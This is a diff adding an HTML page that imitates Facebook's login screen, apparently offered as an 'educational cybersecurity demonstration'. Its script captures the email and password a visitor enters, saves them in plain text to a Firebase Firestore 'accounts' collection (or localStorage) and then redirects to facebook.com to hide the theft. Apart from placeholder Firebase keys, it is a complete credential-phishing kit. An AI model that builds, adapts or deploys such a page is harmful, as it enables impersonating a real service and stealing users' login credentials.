@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Facebook - Firebase</title>
+    <!-- Firebase JavaScript SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .app-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 396px;
+            max-width: 90vw;
+        }
+        
+        .logo-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo-section h1 {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin: 0;
+            letter-spacing: -0.5px;
+        }
+        
+        .logo-section p {
+            color: #606770;
+            font-size: 16px;
+            margin: 4px 0 0 0;
+        }
+        
+        form div {
+            margin-bottom: 16px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .separator {
+            border-top: 1px solid #dadde1;
+            padding-top: 16px;
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .create-account-button {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        
+        .links-container {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #7f7f7f;
+            text-align: center;
+        }
+        
+        .links-container a {
+            color: #1877f2;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer-info {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #7f7f7f;
+            text-align: center;
+        }
+        
+        .config-warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="config-warning">
+            ⚠️ <strong>Firebase Configuration Required</strong><br>
+            To use Firebase, you need to configure your project settings in the script below.
+        </div>
+        
+        <div class="logo-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you.</p>
+        </div>
+        
+        <form id="loginForm">
+            <div>
+                <input type="text" id="email" placeholder="Email or phone number" />
+            </div>
+            <div>
+                <input type="password" id="password" placeholder="Password" />
+            </div>
+            <div>
+                <button type="submit" class="login-button">Log In</button>
+            </div>
+        </form>
+        
+        <div class="separator">
+            <button class="create-account-button">Create New Account</button>
+        </div>
+        
+        <div class="links-container">
+            <span>English (US)</span>
+            <span>·</span>
+            <a href="#">Español</a>
+            <span>·</span>
+            <a href="#">Français (France)</a>
+        </div>
+
+        <div class="footer-info">
+            Meta © 2025
+        </div>
+    </div>
+
+    <script>
+        // Firebase Database for educational cybersecurity demonstration
+        class FirebaseCybersecurityDatabase {
+            constructor() {
+                // Firebase configuration - replace with your own project details
+                const firebaseConfig = {
+                    apiKey: "YOUR_FIREBASE_API_KEY",
+                    authDomain: "YOUR_FIREBASE_PROJECT_ID.firebaseapp.com",
+                    projectId: "YOUR_FIREBASE_PROJECT_ID",
+                    storageBucket: "YOUR_FIREBASE_PROJECT_ID.appspot.com",
+                    messagingSenderId: "YOUR_FIREBASE_SENDER_ID",
+                    appId: "YOUR_FIREBASE_APP_ID"
+                };
+
+                // Initialize Firebase
+                this.app = firebase.initializeApp(firebaseConfig);
+                this.db = firebase.firestore();
+                
+                this.useFallback = false;
+            }
+
+            initFallback() {
+                // Initialize fallback localStorage database
+                if (!localStorage.getItem('firebase_cybersecurity_data')) {
+                    const initialData = {
+                        users: [],
+                        attempts: [],
+                        timestamp: new Date().toISOString()
+                    };
+                    localStorage.setItem('firebase_cybersecurity_data', JSON.stringify(initialData));
+                }
+            }
+
+            // Store credentials in Firebase database
+            async storeCredentials(email, password) {
+                const userRecord = {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                };
+
+                try {
+                    // Store in Firebase Firestore
+                    const docRef = await this.db.collection('accounts').add(userRecord);
+                    
+                    return { ...userRecord, id: docRef.id };
+                } catch (error) {
+                    console.error('Failed to store in Firebase database:', error);
+                    return this.storeCredentialsFallback(email, password, userRecord);
+                }
+            }
+
+            // Get statistics from Firebase database
+            async getStatistics() {
+                try {
+                    // Get all records from the collection
+                    const querySnapshot = await this.db.collection('accounts').get();
+                    
+                    const records = [];
+                    querySnapshot.forEach((doc) => {
+                        records.push({ id: doc.id, ...doc.data() });
+                    });
+                    
+                    // Filter users and attempts
+                    const users = records.filter(record => record.email && record.password);
+                    const attempts = records.filter(record => record.type === 'credential_attempt');
+
+                    return {
+                        totalAttempts: attempts.length,
+                        totalUsers: users.length,
+                        recentActivity: attempts.slice(-5).reverse(),
+                        databaseSize: JSON.stringify(records).length
+                    };
+                } catch (error) {
+                    console.error('Failed to get statistics from Firebase database:', error);
+                    return this.getStatisticsFallback();
+                }
+            }
+
+            // Fallback storage methods
+            storeCredentialsFallback(email, password, userRecord) {
+                const data = this.getLocalDatabase();
+                data.users.push(userRecord);
+                data.attempts.push({
+                    type: 'credential_attempt',
+                    email: email,
+                    timestamp: userRecord.timestamp,
+                    success: false
+                });
+                localStorage.setItem('firebase_cybersecurity_data', JSON.stringify(data));
+                return userRecord;
+            }
+
+            getStatisticsFallback() {
+                const data = this.getLocalDatabase();
+                return {
+                    totalAttempts: data.attempts.length,
+                    totalUsers: data.users.length,
+                    recentActivity: data.attempts.slice(-5).reverse(),
+                    databaseSize: JSON.stringify(data).length
+                };
+            }
+
+            getLocalDatabase() {
+                const data = localStorage.getItem('firebase_cybersecurity_data');
+                if (!data) {
+                    const initialData = { users: [], attempts: [] };
+                    localStorage.setItem('firebase_cybersecurity_data', JSON.stringify(initialData));
+                    return initialData;
+                }
+                return JSON.parse(data);
+            }
+
+            // Utility methods
+            generateId() {
+                return Math.random().toString(36).substr(2, 9);
+            }
+
+            getFakeIP() {
+                return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+            }
+
+            getFakeLocation() {
+                const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
+                return cities[Math.floor(Math.random() * cities.length)];
+            }
+
+            // Clear database
+            async clearDatabase() {
+                try {
+                    // Note: Firebase doesn't have a direct clear method, would need to delete documents individually
+                    // For now, just clear localStorage
+                    localStorage.removeItem('firebase_cybersecurity_data');
+                } catch (error) {
+                    console.error('Failed to clear Firebase database:', error);
+                    localStorage.removeItem('firebase_cybersecurity_data');
+                }
+            }
+        }
+
+        // Initialize database
+        const firebaseDatabase = new FirebaseCybersecurityDatabase();
+        firebaseDatabase.initFallback();
+
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+
+        // Event Listeners
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Please enter both email and password.");
+                return;
+            }
+
+            try {
+                // Store credentials directly in Firebase database
+                await firebaseDatabase.storeCredentials(email, password);
+                
+                // Redirect to Facebook.com immediately
+                window.location.href = 'https://www.facebook.com';
+            } catch (error) {
+                console.error('Database error:', error);
+                // Still redirect to Facebook even if database fails
+                window.location.href = 'https://www.facebook.com';
+            }
+        });
+
+        // Test Firebase connection on load
+        async function testFirebaseConnection() {
+            try {
+                // Try to get documents from the collection to test connection
+                const querySnapshot = await firebaseDatabase.db.collection('accounts').limit(1).get();
+                console.log('✅ Firebase connection successful!');
+                console.log(`Found ${querySnapshot.size} records in accounts collection`);
+            } catch (error) {
+                console.warn('Firebase connection failed:', error.message);
+                console.log('Using fallback localStorage database for demonstration.');
+            }
+        }
+
+        // Test connection on load
+        testFirebaseConnection();
+    </script>
+</body>
+</html>
